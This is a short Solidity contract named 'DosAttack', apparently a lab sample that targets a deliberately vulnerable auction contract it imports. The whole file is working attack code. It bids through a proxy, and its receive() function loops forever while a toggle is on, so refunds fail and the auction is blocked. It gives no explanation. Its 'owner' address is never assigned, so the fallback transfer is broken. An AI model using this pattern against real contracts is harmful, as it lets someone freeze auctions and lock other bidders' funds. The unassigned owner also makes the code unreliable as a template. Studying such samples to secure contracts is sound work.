//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0; 

import "./DosAuction.sol";

contract DosAttack {
  DosAuction auction;
  bool hack = true;
  address payable owner;

  constructor(address _auction) {
    auction = DosAuction(_auction);
  }

  function proxyBid() external payable {
    auction.bid{value: msg.value}();
  }

  function toggleHack() external {
    hack = !hack;
  }

  receive() external payable {
    if (hack) {
      while(true) {}
      // assert(false);
    } else {
      owner.transfer(msg.value);
    }
  }
}